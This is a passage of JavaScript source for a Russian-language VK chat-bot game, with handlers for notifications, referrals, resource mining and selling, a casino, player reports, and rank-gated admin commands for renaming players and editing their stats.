updates.hear(/выключить уведомления|уведомления выкл$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	user.notifications = false
	let nf = user.notifications
	let nfb
	if(nf == true) {
    nf = Keyboard.PRIMARY_COLOR
    nfb = Keyboard.SECONDARY_COLOR
    }
	if(nf == false) {
	nfb = Keyboard.PRIMARY_COLOR
    nf = Keyboard.SECONDARY_COLOR
    }
	let nc = user.nicknotify
	let ncb
	if(nc == true) {
    nc = Keyboard.PRIMARY_COLOR
    ncb = Keyboard.SECONDARY_COLOR
    }
	if(nc == false) {
    ncb = Keyboard.PRIMARY_COLOR
    nc = Keyboard.SECONDARY_COLOR
    }
	return context.send({message: `${nick}, уведомления отключены!\n🔕`,
      keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({ 
            label: '🔔 Включить уведомления', 
            color: nf,
            }),
            Keyboard.textButton({ 
            label: '🔕 Выключить уведомления', 
            color: nfb,
            }),
      ],
      [
            Keyboard.textButton({ 
            label: '☝️ Кликабельный ник', 
            color: nc,
            }),
            Keyboard.textButton({ 
            label: '👊 Некликабельный ник', 
            color: ncb,
            })
      ],
      [
            Keyboard.textButton({ 
            label: '◀️ В раздел «разное»', 
            color: Keyboard.PRIMARY_COLOR,
            })           
      ]
     ])
     .inline(platform)
  })
	})

updates.hear(/\/кнопки вкл/i, (context) => {
	let platform = false
	if(context.isChat) platform = true
	let user = base.bs[base.id[context.senderId].id]
	let nick = ``
	if(user.nicknotify == false) {
		nick = `${base.bs[base.id[context.senderId].id].nick}`
	}
	if(user.nicknotify == true) {
		nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
	}
	let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	if(context.isChat) return context.send(`${nick}, данную команду можно использовать только в ЛС!!`)
	user.keyb = Number(1)
	context.send({
		message: `💡 Кнопки включены. (/кнопки выкл)`,
		keyboard: Keyboard.keyboard([
				[
					Keyboard.textButton({
						label: `◀ В главное меню`
					})
				],
				[
					Keyboard.textButton({
						label: `${user.keyb1}`
					}),
					Keyboard.textButton({
						label: `${user.keyb2}`
					}),
					Keyboard.textButton({
						label: `${user.keyb3}`
					})
				]
			])
	})
})



updates.hear(/\/кнопки изм (.*) (.*)/i, async (context) => {
	let platform = false
	if(context.isChat) platform = true
	let user = base.bs[base.id[context.senderId].id]
	let nick = ``
	if(user.nicknotify == false) {
		nick = `${base.bs[base.id[context.senderId].id].nick}`
	}
	if(user.nicknotify == true) {
		nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
	}
	let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	if(context.isChat) return context.send(`${nick}, данную команду можно использовать только в ЛС!!`)
	if(!Number(context.$match[2])) return context.send(`${nick}, вы ввели некорректный номер кнопки.`)
	if(Number(context.$match[2]) < 1) return context.send(`${nick}, вы ввели некорректный номер кнопки.`)
	if(Number(context.$match[2]) > 3) return context.send(`${nick}, вы ввели некорректный номер кнопки.`)
	if(context.$match[1].length > 50) return context.send(`${nick}, вы ввели слишком большое название кнопки.`)
	if(Number(context.$match[2]) === 1) user.keyb1 = `${context.$match[1]}`
	if(Number(context.$match[2]) === 2) user.keyb2 = `${context.$match[1]}`
	if(Number(context.$match[2]) === 3) user.keyb3 = `${context.$match[1]}`
	return context.send({
		message: `${nick}, вы успешно сменили текст кнопки.`,
		keyboard: Keyboard.keyboard([
				[
					Keyboard.textButton({
						label: `◀ В главное меню`
					})
				],
				[
					Keyboard.textButton({
						label: `${user.keyb1}`
					}),
					Keyboard.textButton({
						label: `${user.keyb2}`
					}),
					Keyboard.textButton({
						label: `${user.keyb3}`
					})
				]
			])
	})
})

updates.hear(/\/кнопки/i, (context) => {
	let platform = false
	if(context.isChat) platform = true
	let user = base.bs[base.id[context.senderId].id]
	let nick = ``
	if(user.nicknotify == false) {
		nick = `${base.bs[base.id[context.senderId].id].nick}`
	}
	if(user.nicknotify == true) {
		nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
	}
	let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	if(context.isChat) return context.send(`${nick}, данную команду можно использовать только в ЛС!!`)
	return context.send(`📚 Настройка:
						 | /кнопки вкл / включить кнопки.
						 | /кнопки изм (текст) (1-3)/ изменить текст кнопки.`)
})

updates.hear(/включить уведомления|уведомления вкл$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	user.notifications = true
	let nf = user.notifications
	let nfb
	if(nf == true) {
    nf = Keyboard.PRIMARY_COLOR
    nfb = Keyboard.SECONDARY_COLOR
    }
	if(nf == false) {
	nfb = Keyboard.PRIMARY_COLOR
    nf = Keyboard.SECONDARY_COLOR
    }
	let nc = user.nicknotify
	let ncb
	if(nc == true) {
    nc = Keyboard.PRIMARY_COLOR
    ncb = Keyboard.SECONDARY_COLOR
    }
	if(nc == false) {
    ncb = Keyboard.PRIMARY_COLOR
    nc = Keyboard.SECONDARY_COLOR
    }
	return context.send({message: `${nick}, уведомления включены!\n🔔`,
      keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({ 
            label: '🔔 Включить уведомления', 
            color: nf,
            }),
            Keyboard.textButton({ 
            label: '🔕 Выключить уведомления', 
            color: nfb,
            }),
      ],
      [
            Keyboard.textButton({ 
            label: '☝️ Кликабельный ник', 
            color: nc,
            }),
            Keyboard.textButton({ 
            label: '👊 Некликабельный ник', 
            color: ncb,
            })
      ],
      [
            Keyboard.textButton({ 
            label: '◀️ В раздел «разное»', 
            color: Keyboard.PRIMARY_COLOR,
            })           
      ]
     ])
     .inline(platform)
  })
	})



updates.hear(/реф топ$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	let top = []
	let text = ``
	for(let i in base.bs){
		if(base.bs[i].ref !== 0){
			top.push({
				id: base.id[base.bs[i].id].id,
				ref: base.bs[i].refs
			})
		}
	}

	top.sort(function(a, b) { 
		if (b.ref > a.ref) return 1 
		if (b.ref < a.ref) return -1 
		return 0
	}); //Сортировка

	for(let j = 0; j < 5; j++){
		text += `\n${j+1} >> *id${base.bs[top[j].id].id} (${base.bs[top[j].id].nick}) >> ${top[j].ref}👥`
	}

	return context.send(`${nick}, топ рефералов:${text}\n🛀 Топеру №1 каждый день в 22:00 выдаётся от 5трлн до 25трлн.`)
})

updates.hear(/реф$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	let ssilka = `vk.me/bot_jopa?ref=${base.id[context.senderId].id}`
	return context.send(`${nick}, ваша реферальная ссылка: ${ssilka}✅
	💎 Вы пригласили в игру: ${user.refs} чел.
	📮 Заработано на рефералах: ${utils.sp(user.refs * 250000000000)}$

	🤝 Ваш друг должен перейти по Вашей реферальной ссылке.
`)
	
})

updates.hear(/^(?:~replace)\s([0-9]+)\s(.*)\s(.*)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan] 
 if(user.rank < 5) return 
 if(!base.bs[context.$match[1]]) return context.send(`Error: (User with id: ${context.$match[1]} not founded) ❎`) 
 if(user.rank < 6){
    if(context.$match[2] == "balance" || context.$match[2] == "id" || context.$match[2] == "bank" || context.$match[2] == "rate" || context.$match[2] == "rank" || context.$match[2] == "farms") return context.send(`Error: (Can't change this task) ❎`)
 } 
 base.bs[context.$match[1]][context.$match[2]] = 1
 if(Number(base.bs[context.$match[1]][context.$match[2]])) { 
  base.bs[context.$match[1]][context.$match[2]] = Number(context.$match[3]) 
  let one = context.$match[2]
  let two = context.$match[3]
  vk.api.messages.send({chat_id: adminchat, message:`
[#LOG]
*id${context.senderId} (Разработчик ⚙️) изменил значение переменной «${one}» игроку: "*id${base.bs[context.$match[1]].id} (${base.bs[context.$match[1]].nick})" На: «${(two)}» `})
  return context.send(`Successful - NUM ☑`) 
 } else { 
  base.bs[context.$match[1]][context.$match[2]] = context.$match[3]; 
  return context.send(`Successful - STR ☑`) 
 } 
})

updates.hear(/newtask_str (.*) (.*)$/i,async (context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan] 
if(user.rank < 5) return 
let basad = [] 
for (let i in base.bs){
basad.push({ 
id: i 
}) 
} 
for (let j = 0; j < basad.length; j++){ 
base.bs[basad[j].id][context.$match[1]] = `${context.$match[2]}` 
} 
return context.send(`Вы успешно добавили новые переменные`) 
}) 

updates.hear(/(?:newtask_num)\s(.*)\s(.*)$/i,async (context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan] 
if(user.rank < 5) return 
let basad = [] 
for (let i in base.bs){
basad.push({ 
id: i 
}) 
} 
for (let j = 0; j < basad.length; j++){ 
base.bs[basad[j].id][context.$match[1]] = Number(context.$match[2]) 
} 
return context.send(`Вы успешно добавили новые переменные`) 
}) 



updates.hear(/^(?:репорт (.*))$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(user.reportban == true) return context.send(`${nick}, вам запрещено писать в репорт 😒`)
let rid = reportid.lastreport
rid += Number(1)
reportid.lastreport += Number(1)
reportid.reports[rid] = {
id: rid,
sender: base.id[context.senderId].id
}
let title = `[ГРУППА]`
if(context.isChat) title = `[ГРУППА В БЕСЕДЕ]`
vk.api.messages.send({chat_id: adminchat, message:`${title}\n🗣️ Отправил: ${context.senderId}\n🔍 Игровой ид: ${base.id[context.senderId].id}\n✏️ ID жалобы: ${rid}\n➡️ ${nick}: ${context.$match[1]}`})
vk.api.messages.send({chat_id: modchat, message:`${title}\n🗣️ Отправил: ${context.senderId}\n🔍 Игровой ид: ${base.id[context.senderId].id}\n✏️ ID жалобы: ${rid}\n➡️ ${nick}: ${context.$match[1]}`})

return context.send(`${nick}, ваше сообщение отправлено. Номер заявки: №${rid} 👍`)
	
	
})

updates.hear(/продать материю/i, async (context) => {
	let platform = false
	if(context.isChat) platform = true
	let user = base.bs[base.id[context.senderId].id]
	let nick = ``
	if(user.nicknotify == false) {
		nick = `${base.bs[base.id[context.senderId].id].nick}`
	}
	if(user.nicknotify == true) {
		nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
	}
	let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	if(user.materia < 1) return context.send(`${nick}, у Вас нет материи. 📛`)
	let gold = user.materia
	let golds = user.materia*5000000
	user.materia = 0
	user.balance += Number(golds)
	return context.send(`${nick}, вы продали ${gold} материи за ${utils.sp(golds)}$ ✅`)
})

updates.hear(/продать алмазы/i, async (context) => {
	let platform = false
	if(context.isChat) platform = true
	let user = base.bs[base.id[context.senderId].id]
	let nick = ``
	if(user.nicknotify == false) {
		nick = `${base.bs[base.id[context.senderId].id].nick}`
	}
	if(user.nicknotify == true) {
		nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
	}
	let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	if(user.diamonds < 1) return context.send(`${nick}, у Вас нет алмазов. 📛`)
	let gold = user.diamond
	let golds = user.diamond*3250000
	user.diamond = 0
	user.balance += Number(golds)
	return context.send(`${nick}, вы продали ${gold} алмазов за ${utils.sp(golds)}$ ✅`)
})

updates.hear(/продать золото/i, async (context) => {
	let platform = false
	if(context.isChat) platform = true
	let user = base.bs[base.id[context.senderId].id]
	let nick = ``
	if(user.nicknotify == false) {
		nick = `${base.bs[base.id[context.senderId].id].nick}`
	}
	if(user.nicknotify == true) {
		nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
	}
	let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	if(user.gold < 1) return context.send(`${nick}, у Вас нет золота. 📛`)
	let gold = user.gold
	let golds = user.gold*1250000
	user.gold = 0
	user.balance += Number(golds)
	return context.send(`${nick}, вы продали ${gold} золота за ${utils.sp(golds)}$ ✅`)
})

updates.hear(/продать железо/i, async (context) => {
	let platform = false
	if(context.isChat) platform = true
	let user = base.bs[base.id[context.senderId].id]
	let nick = ``
	if(user.nicknotify == false) {
		nick = `${base.bs[base.id[context.senderId].id].nick}`
	}
	if(user.nicknotify == true) {
		nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
	}
	let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	if(user.iron < 1) return context.send(`${nick}, у Вас нет железа. 📛`)
	let gold = user.iron
	let golds = user.iron*15000
	user.iron = 0
	user.balance += Number(golds)
	return context.send(`${nick}, вы продали ${gold} железа за ${utils.sp(golds)}$ ✅`)
})

updates.hear(/копать материю/i, async (context) => {
	let platform = false
	if(context.isChat) platform = true
	let user = base.bs[base.id[context.senderId].id]
	let nick = ``
	if(user.nicknotify == false) {
		nick = `${base.bs[base.id[context.senderId].id].nick}`
	}
	if(user.nicknotify == true) {
		nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
	}
	let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	if(user.exp < 3000) return context.send(`${nick}, чтобы копать материю нужно больше 3.000 опыта.\nКопайте золото, открывайте кейсы и увеличивайте свой опыт! 📛`)
	if(user.energy === 0) return context.send(`${nick}, вы сильно устали.
											📛 Энергия появляется каждые 5 минут!`)
	let gold = getRandomInRange(10,50)
	user.exp += Number(10)
	user.materia += Number(gold)
	user.energy -= Number(1)
	if(user.exp === 0){
		return context.send(`${nick}, +${gold} материи.
		Энергия закончилась. 📛`)
	}
	return context.send(`${nick}, +${gold} материи.
	💡 Энергия: ${user.energy}, опыт: ${user.exp}`)
})

updates.hear(/копать алмазы/i, async (context) => {
	let platform = false
	if(context.isChat) platform = true
	let user = base.bs[base.id[context.senderId].id]
	let nick = ``
	if(user.nicknotify == false) {
		nick = `${base.bs[base.id[context.senderId].id].nick}`
	}
	if(user.nicknotify == true) {
		nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
	}
	let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	if(user.exp < 1000) return context.send(`${nick}, , чтобы копать алмазы нужно больше 1.000 опыта.\nКопайте золото, открывайте кейсы и увеличивайте свой опыт! 📛`)
	if(user.energy === 0) return context.send(`${nick}, вы сильно устали.
											📛 Энергия появляется каждые 5 минут!`)
	let gold = getRandomInRange(20,80)
	user.exp += Number(5)
	user.diamond += Number(gold)
	user.energy -= Number(1)
	if(user.exp === 0){
		return context.send(`${nick}, +${gold} алмазов.
		Энергия закончилась. 📛`)
	}
	return context.send(`${nick}, +${gold} алмазов.
	💡 Энергия: ${user.energy}, опыт: ${user.exp}`)
})

updates.hear(/копать золото/i, async (context) => {
	let platform = false
	if(context.isChat) platform = true
	let user = base.bs[base.id[context.senderId].id]
	let nick = ``
	if(user.nicknotify == false) {
		nick = `${base.bs[base.id[context.senderId].id].nick}`
	}
	if(user.nicknotify == true) {
		nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
	}
	let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	if(user.exp < 500) return context.send(`${nick}, чтобы копать золото нужно больше 500 опыта.\nКопайте золото, открывайте кейсы и увеличивайте свой опыт! 📛`)
	if(user.energy === 0) return context.send(`${nick}, вы сильно устали.
											📛 Энергия появляется каждые 5 минут!`)
	let gold = getRandomInRange(20,100)
	user.exp += Number(3)
	user.gold += Number(gold)
	user.energy -= Number(1)
	if(user.exp === 0){
		return context.send(`${nick}, +${gold} золота.
		Энергия закончилась. 📛`)
	}
	return context.send(`${nick}, +${gold} золота.
	💡 Энергия: ${user.energy}, опыт: ${user.exp}`)
})

updates.hear(/копать железо/i, async (context) => {
	let platform = false
	if(context.isChat) platform = true
	let user = base.bs[base.id[context.senderId].id]
	let nick = ``
	if(user.nicknotify == false) {
		nick = `${base.bs[base.id[context.senderId].id].nick}`
	}
	if(user.nicknotify == true) {
		nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
	}
	let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	if(user.energy === 0) return context.send(`${nick}, вы сильно устали.
											📛 Энергия появляется каждые 5 минут!`)
	let gold = getRandomInRange(20,100)
	user.exp += Number(1)
	user.iron += Number(gold)
	user.energy -= Number(1)
	if(user.exp === 0){
		return context.send(`${nick}, +${gold} железа.
		Энергия закончилась. 📛`)
	}
	return context.send(`${nick}, +${gold} железа.
	💡 Энергия: ${user.energy}, опыт: ${user.exp}`)
})

updates.hear(/отв ([0-9]+) (.*)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(user.rank < 4) return
let rid = context.$match[1]
if(!reportid.reports[rid]) return context.send(`${nick}, репорт с таким ID не найден, или на него уже ответил другой администратор ☹️`)
let ans = `${context.$match[2]}`
let task = base.bs[reportid.reports[rid].sender]
vk.api.messages.send({user_id: task.id, message: `🔔 *id${task.id} (${task.nick}), на ваше сообщение №${rid} поступил ответ:\n💬 ${ans}`})
delete reportid.reports[rid]
return context.send(`${nick}, ответ доставлен 👍`)
})

updates.hear(/казино (.*)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan] 
 
let res = context.$match[1]
	while(res.includes(`к`)){
		res = res.replace(`к`,`000`)
	}
	while(res.includes(`k`)){
		res = res.replace(`k`,`000`)
	}
	while(res.includes(`.`)){
		res = res.replace(`.`,``)
	}
	while(res.includes(`-`)){
		res = res.replace(`-`,``)
	}
	while(res.includes(`всё`)){
		res = res.replace(`всё`,`${user.balance}`)
	}
	while(res.includes(`все`)){
		res = res.replace(`все`,`${user.balance}`)
	}
	while(res.includes(`вабанк`)){
		res = res.replace(`вабанк`,`${user.balance}`)
	}
 if(!Number(res)) return context.send(`${nick}, ставка должна быть минимум 1$ 😲`) 
 if(user.balance < Number(res)) return context.send(`${nick}, у вас недостаточно денег 😒
💰 Баланс: ${utils.sp(user.balance)}$`)
 if(res < 1) return context.send(`${nick}, ставка должна быть минимум 1$ 😲`)
 
 let numb = 0
 let random = getRandomInRange(0, 100)
let addtext = ``
 if(random > 0) numb = 0
 if(random > 5) numb = 0.5
 if(random > 80) numb = 2
 if(random > 97) numb = 10
if(user.potioneffect == 1 && user.potioneffecttime > 0 && user.rank < 2) {
if(numb == 0) {
random = getRandomInRange(1, 100)
 if(random > 0) numb = 0
 if(random > 25) numb = 0.5
 if(random > 90) numb = 2
 if(numb !== 0) addtext = `🍹 Вам бы выпало x0, если бы не зелье`
	}
if(numb == 0.5) {
random = getRandomInRange(1, 100)
 if(random > 0) numb = 0.5
 if(random > 90) numb = 2
 if(numb !== 0.5) addtext = `🍹 Вам бы выпало x0.5, если бы не зелье`
	}
	}
if(user.rank > 1) {
let status = ``
if(user.rank == 2) status = `🔥 V.i.P`
if(user.rank == 3) status = `🔮 Premium`
if(user.rank == 4) status = `🌀 Модератор`
if(user.rank > 4) status = `👑 Администратор`
if(numb == 0) {
random = getRandomInRange(1, 100)
 if(random > 0) numb = 0
 if(random > 25) numb = 0.5
 if(random > 90) numb = 2
 if(numb !== 0) addtext = `✨ Вам бы выпало x0, если бы не ${status}`
	}
if(numb == 0.5) {
random = getRandomInRange(1, 100)
 if(random > 0) numb = 0.5
 if(random > 90) numb = 2
 if(numb !== 0.5) addtext = `✨ Вам бы выпало x0.5, если бы не ${status}`
	}
	}


 let noule = res
 let count = Math.trunc(res * numb)
 let doouble = count / 70
 doouble = Math.trunc(doouble)
 
  if(numb == 0) count = user.balance

 let result = 0 
 if(numb == 0) result = "вы проиграли"
 if(numb == 0.5) result = "вы проиграли"
  if(numb == 0.75) result = "вы проиграли"
 if(numb == 1) result = "деньги остаются при Вас!"
 if(numb == 2) result = "вы выиграли"
 if(numb == 3) result = "вы выиграли"
 if(numb == 10) result = "вы выиграли"
 
 let smile = 0 
  if(numb == 0) smile = utils.pick([`😲`, `😣`, ` 😮`,`😔`]) 
 if(numb == 0.5) smile = utils.pick([`😲`, `😣`, ` 😮`,`😔`]) 
  if(numb == 0.75) smile = utils.pick([`😲`, `😣`, ` 😮`,`😔`]) 
 if(numb == 1) smile = utils.pick([`😀`, `😚`, ` ☺️`,`😏`]) 
 if(numb == 2) smile = utils.pick([`😎`, `😀`, ` 🤑`,`😇`]) 
 if(numb == 10) smile = utils.pick([`😎`, `😀`, ` 🤑`,`😇`]) 
 if(numb == 3) smile = utils.pick([`👑`, `😀`, ` 🤑`,`😇`]) 
 if(numb == 0) count = noule
 
 user.balance -= Number(res)  
 user.balance += Math.trunc(res * numb) 
 
let one = user.balance
let two = user.balance
let three = user.balance
let four = user.balance
let five = user.balance
let six = user.balance
one /= Number(4)
two /= Number(2)
three = Number(three)
four /= Number(12)
five /= Number(3)
six /= Number(1.5)
if(user.keyb === Number(0)) {
	return context.send({message: `${nick}, ${(result)} ${utils.sp(count)}$ (x${numb}) ${(smile)} \n💰Баланс: ${utils.sp(user.balance)}$\n${addtext}`,
      keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({ 
            label: `🎰 ${utils.sp(Math.trunc(one))}$`, 
            color: Keyboard.SECONDARY_COLOR,
            }),
            Keyboard.textButton({ 
            label: `🎰 ${utils.sp(Math.trunc(two))}$`, 
            color: Keyboard.SECONDARY_COLOR,
            }),
            Keyboard.textButton({ 
            label: `🎰 ${utils.sp(Math.trunc(three))}$`, 
            color: Keyboard.SECONDARY_COLOR,
            })
      ],
      [
            Keyboard.textButton({ 
            label: `🎰 ${utils.sp(Math.trunc(four))}$`, 
            color: Keyboard.SECONDARY_COLOR,
            }),
            Keyboard.textButton({ 
            label: `🎰 ${utils.sp(Math.trunc(five))}$`, 
            color: Keyboard.SECONDARY_COLOR,
            }),
            Keyboard.textButton({ 
            label: `🎰 ${utils.sp(Math.trunc(six))}$`, 
            color: Keyboard.SECONDARY_COLOR,
            })
      ],
      [
      		Keyboard.textButton({ 
      		label: '◀ Игры', 
      		color: Keyboard.PRIMARY_COLOR,
     		})
      ]
     ])
     .inline(platform)
 })
}

return context.send(`${nick}, ${(result)} ${utils.sp(count)}$ (x${numb}) ${(smile)} \n💰Баланс: ${utils.sp(user.balance)}$\n${addtext}`)
 
 })


updates.hear(/setnick ([0-9]+) (.*)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(user.rank < 4) return
if(!base.bs[context.$match[1]]) return context.send(`${nick}, ид указан неверно! 🔍`)
if(context.$match[2].length > 25) return context.send(`${nick}, Максимальная длина ника 25 символов. 😒`)
let task = base.bs[context.$match[1]]
let newnick = context.$match[2].replace(".", "°")
newnick = newnick.replace(".", "°")
newnick = newnick.replace(".", "°")
newnick = newnick.replace(".", "°")
newnick = newnick.replace(".", "°")
newnick = newnick.replace(".", "°")
newnick = newnick.replace(".", "°")
newnick = newnick.replace(".", "°")
newnick = newnick.replace(".", "°")
newnick = newnick.replace(".", "°")
newnick = newnick.replace(".", "°")

let oldnick = `${task.nick}`
task.nick = `${newnick}`
return context.send(`${nick}, Пользователю *id${task.id} (${oldnick}) — сменён ник на «${newnick}» 👍`)

	
})

updates.hear(/беседа/i, async (context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	if(!context.isChat) return context.send(`${nick}, данную команду можно использовать только в беседах.\nhttps://vk.me/join/AJQ1d3ZZwxVAf3/E4sHsuyrI`)
	let chatd = []
	let topme = []
	let text = ``
	for(let i in chats.ids){
		chatd.push({
			id: chats.ids[i].id,
			message: chats.ids[i].message
		})
	}
	chatd.sort(function(a, b) { 
		if (b.message > a.message) return 1 
		if (b.message < a.message) return -1 
		return 0
	});
	let chai = `${context.chatId}`
	for (let s = 0; s < chatd.length; s++){
    	topme.push(chatd[s].id)
	}
  let b = `${Number(find(topme, chai)+1)}`
    return context.send(`${nick}, данная беседа на ${b} месте. 😱\np.s Скоро будут вознаграждения за топы бесед.\n😅 [Накрутка сообщений запрещена]`)
})

updates.hear(/им ([0-9]+) бизнес (.*)/i,(context) => {
let usid = base.id[context.senderId].id
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(user.rank < 3) return
if(!base.bs[context.$match[1]]) return context.send(`${nick}, ид указан неверно! 🔍`)
if(Number(context.$match[1]) !== Number(usid) && user.rank == 3) return context.send(`${nick}, Вы не можете менять названия Имуществ другим игрокам!😒`)
let task = base.bs[context.$match[1]]
let net = `💼 бизнеса`
let newname = `${context.$match[2]}`
if(task.biznesid < 1) return context.send(`${nick}, у *id${task.id} (Пользователя) нет ${net} 😒`)
task.biznesname = newname
return context.send(`${nick}, название изменено! 👍`)
})

updates.hear(/им ([0-9]+) питомец (.*)/i,(context) => {
let usid = base.id[context.senderId].id
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(user.rank < 4) return
if(!base.bs[context.$match[1]]) return context.send(`${nick}, ид указан неверно! 🔍`)
if(Number(context.$match[1]) !== Number(usid) && user.rank == 3) return context.send(`${nick}, Вы не можете менять названия Имуществ другим игрокам!😒`)

let task = base.bs[context.$match[1]]
let net = `🐰 питомца`
let newname = `${context.$match[2]}`
if(task.petid < 1) return context.send(`${nick}, у *id${task.id} (Пользователя) нет ${net} 😒`)
task.petname = newname
return context.send(`${nick}, название изменено! 👍`)
})



updates.hear(/им ([0-9]+) телефон (.*)/i,(context) => {
let usid = base.id[context.senderId].id
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(user.rank < 4) return
if(!base.bs[context.$match[1]]) return context.send(`${nick}, ид указан неверно! 🔍`)
if(Number(context.$match[1]) !== Number(usid) && user.rank == 3) return context.send(`${nick}, Вы не можете менять названия Имуществ другим игрокам!😒`)

let task = base.bs[context.$match[1]]
let net = `📱 телефона`
let newname = `${context.$match[2]}`
